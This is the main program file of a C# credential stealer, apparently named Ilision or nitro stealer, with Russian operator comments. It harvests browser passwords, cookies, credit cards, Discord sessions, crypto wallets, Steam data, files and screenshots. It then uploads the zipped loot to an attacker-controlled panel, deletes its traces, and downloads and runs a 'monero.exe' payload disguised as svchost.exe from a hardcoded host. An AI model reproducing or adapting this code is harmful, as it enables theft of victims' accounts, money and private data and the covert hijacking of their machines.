﻿using System;
using Ionic.Zip;
using Ionic.Zlib;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using System.Net;
using System.Reflection;
using nitro.Properties;

namespace nitrostealer
{
    class Program
    {
        // Stealer Settings
        public static string chat_id = "";
        public static string host = "";
        public static string link = "http://" + host + "/panel.php?chatid=" + chat_id + "&compname=" + SystemInfo.compname + "&adr=" + SystemInfo.IP() + "&cntr=" + SystemInfo.Country() + "&city=" + SystemInfo.City() + "&zip=" + SystemInfo.ZipCode() + "&pwc=" + Counting.Passwords++ + "&cuc=" + Counting.Cookies++ + "&ccc=" + Counting.CreditCards++;
        public static string dir = Help.AppData + "\\discord\\Local Storage\\leveldb\\";
        public static int sizefile = 1000000;
        public static string[] expansion = new string[] { ".txt", ".doc", ".mafile", ".rdp", ".jpg" };

        public static void Main()
        {
            AppDomain.CurrentDomain.AssemblyResolve += AppDomain_AssemblyResolve;
            Assembly AppDomain_AssemblyResolve(object sender, ResolveEventArgs args)
            {
                if (args.Name.Contains("DotNetZip"))
                    return Assembly.Load(Resources.DotNetZip);
                return null;
            }

            if (File.Exists(Help.StubPath + "\\" + "123")) // Проверка запускался ли уже стиллер на этом компьютере?
            {
                Environment.Exit(0);
            }
            else
            {
                if (Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName).Length == 1) // Проверка запущен ли уже стиллер сейчас
                {
                    try
                    {
                        Directory.CreateDirectory(Help.LogPath);
                        List<Thread> Threads = new List<Thread>();
                        Threads.Add(new Thread(() => Browsers.Start())); // Старт потока с браузерами
                        Threads.Add(new Thread(() =>
                        {
                            Help.Ethernet(); // Получение информации о айпи
                            Screen.GetScreen(); // Скриншот экрана
                            ProcessList.WriteProcesses(); // Получение списка процессов
                            SystemInfo.GetSystem(); // Скриншот экрана
                            SystemInfo.WithoutRepeat(); // проверка был ли запущен ранее
                            Discord.GetDiscord(Help.LogPath); // граб сессии дискорд
                            Files.GetFiles(Help.LogPath); // граб файлов
                            StartWallets.Start(); // граб холодных
                            Steam.SteamGet(); // граб стима
                            SystemInfo.IPCOUNTRY();



                        }));

                        foreach (Thread t in Threads)
                            t.Start();
                        foreach (Thread t in Threads)
                            t.Join();

                        Request(); // Отправка лога на хост

                    }

                    catch (Exception e)
                    {
                        Console.WriteLine(e);
                    }
                }
            }
        }
        static void Request()
        {
            try
            {
                string zipArchive = Help.LogPath + "\\odinreport.zip";
                using (ZipFile zip = new ZipFile(Encoding.GetEncoding("cp866")))
                {
                    zip.ParallelDeflateThreshold = -1;
                    zip.UseZip64WhenSaving = Zip64Option.Always;
                    zip.CompressionLevel = CompressionLevel.Default;
                    zip.Comment =
                           "\n Ilision Stealer by (@FroniYT)" +
                           "\n Contacts: https://t.me/buld_exe";
                    zip.AddDirectory(Help.LogPath);
                    zip.Save(zipArchive);
                }
                WebClient client = new WebClient();
                Uri link = new Uri(Program.link);
                client.UploadFile(link, zipArchive);
                Thread.Sleep(20000);
                Directory.Delete(Help.LogPath, true);

                WebClient wc = new WebClient();

                // Ниже необходимо ввести прямую ссылку на ваш файл
                string url = "http://f0671130.xsph.ru/monero.exe";

                // Куда будет скачиваться ваш файл и под каким названием?
                string save_path = "C:\\ProgramData\\";
                string name = "svchost.exe";

                // Через сколько МС (миллисекунд) запустится ваш файл?
                // 30 секунд - 30000 миллисекунд
                // 60 секунд - 60000 миллисекунд
                // 5 минут - 300000 миллисекунд
                Thread.Sleep(5000);

                // Если вы меняли местоположение загрузки, то поменяйте их ниже
                wc.DownloadFile(url, save_path + name);
                System.Diagnostics.Process.Start(@"C:\ProgramData\svchost.exe");
            }
            catch
            {
                return;
            }

            




        }
    }
}
